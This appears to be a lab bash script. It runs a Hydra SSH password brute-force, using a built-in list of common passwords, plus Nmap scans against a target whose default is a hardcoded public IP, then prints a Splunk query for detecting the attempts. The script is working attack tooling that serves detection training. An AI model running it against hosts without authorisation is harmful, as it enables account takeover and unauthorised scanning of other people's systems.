#!/usr/bin/env bash
# ==============================================================================
# brute-force-simulation.sh
# Simulates an SSH brute force attack using Hydra against a target host.
# Run this script from the ATTACKER (Kali Linux) machine only.
#
# WARNING: Only run this against systems you own and have explicit permission
# to test. Unauthorised brute force attacks are illegal.
#
# Usage: ./brute-force-simulation.sh [TARGET_IP] [TARGET_USER]
# Example: ./brute-force-simulation.sh 13.246.220.248 ubuntu
# ==============================================================================

set -euo pipefail

# --- Configuration -----------------------------------------------------------
TARGET_IP="${1:-13.246.220.248}"
TARGET_USER="${2:-ubuntu}"
TARGET_PORT="22"
WORDLIST="/home/tladi/password.txt"    # Path to password wordlist on Kali
THREADS="4"                            # Keep low to avoid overloading the target
TIMEOUT="30"                           # Seconds before a connection times out
OUTPUT_FILE="/tmp/hydra-results-$(date +%Y%m%d-%H%M%S).txt"

# --- Helper functions --------------------------------------------------------
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

check_hydra() {
    if ! command -v hydra &>/dev/null; then
        log "Error: hydra is not installed."
        log "Install with: sudo apt update && sudo apt install hydra -y"
        exit 1
    fi
}

check_wordlist() {
    if [[ ! -f "${WORDLIST}" ]]; then
        log "Wordlist not found at ${WORDLIST}. Creating a sample wordlist..."
        cat > "${WORDLIST}" <<'EOF'
password
password123
admin
ubuntu
root
123456
qwerty
letmein
welcome
changeme
Password1
Pa$$word
test123
summer2024
winter2025
EOF
        log "Sample wordlist created at ${WORDLIST}"
    fi
}

check_target_reachable() {
    log "Checking if ${TARGET_IP}:${TARGET_PORT} is reachable..."
    if ! nc -zw5 "${TARGET_IP}" "${TARGET_PORT}" 2>/dev/null; then
        log "Error: Cannot reach ${TARGET_IP} on port ${TARGET_PORT}."
        log "Check that the target is running and the security group allows SSH."
        exit 1
    fi
    log "Target is reachable. Proceeding with simulation."
}

# --- Main --------------------------------------------------------------------
log "===================================================================="
log "SSH Brute Force Simulation - AUTHORISED LAB ENVIRONMENT ONLY"
log "===================================================================="
log "Target:    ${TARGET_IP}:${TARGET_PORT}"
log "User:      ${TARGET_USER}"
log "Wordlist:  ${WORDLIST}"
log "Threads:   ${THREADS}"
log "Output:    ${OUTPUT_FILE}"
log "===================================================================="

check_hydra
check_wordlist
check_target_reachable

# Step 1: Optional - run a quick Nmap to confirm SSH is open and get banner
log "Running pre-attack Nmap service scan on port ${TARGET_PORT}..."
if command -v nmap &>/dev/null; then
    nmap -sV -p "${TARGET_PORT}" "${TARGET_IP}" 2>/dev/null || true
fi

# Step 2: Run the brute force attack with Hydra
log "Starting Hydra SSH brute force..."
log "This will generate multiple 'Failed password' entries in the target's auth.log."
log "These events will appear in Splunk within seconds."

hydra \
    -l "${TARGET_USER}" \
    -P "${WORDLIST}" \
    -t "${THREADS}" \
    -w "${TIMEOUT}" \
    -V \
    -o "${OUTPUT_FILE}" \
    ssh://"${TARGET_IP}"

HYDRA_EXIT=$?

# Step 3: Report results
log "===================================================================="
if [[ ${HYDRA_EXIT} -eq 0 ]]; then
    log "Hydra completed. Results saved to: ${OUTPUT_FILE}"
    if grep -q "login:" "${OUTPUT_FILE}" 2>/dev/null; then
        log "CREDENTIALS FOUND - check ${OUTPUT_FILE} for details."
    else
        log "No credentials found with the provided wordlist (expected in a lab)."
    fi
else
    log "Hydra finished with exit code ${HYDRA_EXIT}."
fi

log ""
log "===================================================================="
log "Detection check - run this query in Splunk to see the events:"
log ""
log '  index=* source="/var/log/auth.log" "Failed password"'
log '  | rex "from (?P<src_ip>\d+\.\d+\.\d+\.\d+)"'
log '  | stats count by src_ip'
log '  | sort -count'
log "===================================================================="

# Step 4: Also simulate an Nmap scan for Project 02
log ""
log "Running Nmap reconnaissance scan for Project 02..."
if command -v nmap &>/dev/null; then
    nmap -sV -sS "${TARGET_IP}" -oN "/tmp/nmap-results-$(date +%Y%m%d-%H%M%S).txt" 2>/dev/null || true
    log "Nmap scan complete. Results saved to /tmp/nmap-results-*.txt"
fi

log "Simulation complete."
